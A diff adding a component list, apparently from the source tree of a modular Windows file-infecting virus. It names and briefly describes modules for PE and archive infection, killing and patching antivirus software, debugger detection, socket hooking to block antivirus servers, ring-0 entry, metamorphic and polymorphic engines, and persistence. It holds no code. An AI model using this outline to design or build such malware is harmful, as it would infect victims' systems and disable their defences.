@@ -1,0 +1,46 @@
+AAVFILE         antiviral files patcher
+AAVPATCH        antiviral code patcher -- kernel
+ADDPGN          new plugin: RSA-verify & execute
+CODEGEN         metamorphic code generator
+DEBUG           DEBUG plugin; dumps internal events & etc.
+DPGN1           Delayed-Plugin Tech. -- both container & decryptor
+EFFECT1         music effect + max sb vol, to fuckup lamerz
+EFFECT2         video effect - our photo
+ETG             executable trash generator
+EXAMPLE         .cpp example plugin
+EXTMAN          EXTension manager. used as filter for file names
+FILEIO          universal file io       (win32/r3 & win9x/r0)
+FIREWALL        local firewall detection
+FUCKICE         detect & patch soft-ice/trw2000
+IFSHAN          r0 IFS handler
+INFECTA         fast infector
+INFECTB         slow MISTFALL-based infector
+INSTALL0        install into system: call INFECTA for EXPLORER,WSOCK32
+INSTALL3        --//--, in ring-3, using wininit/MoveFileEx
+IOAVFILT        based on iohooker; deny connect to av IPs
+IOHOOKER        WSOCK32.DLL: send/recv/connect hooker
+K1              RSA key
+K2              --//--
+KILLAVXD        AV VxDs killer
+KILLER          critical events handler
+KME             KME (Kewl Mutation Engine) interface
+LDE             length-disassembler
+LDRWIN32        loader for win32 -- not a plugin
+MAIN            main process -- create thread within EXPLORER to work from
+MAKEBODY        builds poly encrypted viral body
+MEMORY          universal malloc/mfree  (win32/r3 & win9x/r0)
+MISTFALL        PE EXE/DLL reversing engine
+MORPHER         links INFECTA with KME; and so on
+PLAN            used to select residency method, send some events, etc.
+R0COPY          create viral copy in r0 (Cxxxxxxx area)
+RANDOM          randomer
+RARZIP          RAR & ZIP infector
+RECSERCH        recursive file search
+REGSCAN         registry scanner (for filenames)
+RING0           win9x: entering ring0
+RSA             modexp subroutine
+SIGMAN          signature manager for MISTFALL
+TEST            test plugin, for debug purposes
+UTIL            common subroutines; universal r0/r3 registry io
+UUE             UU-encoder
+WALKER          scans r3 processes & calls AAVPATCH for each memory block
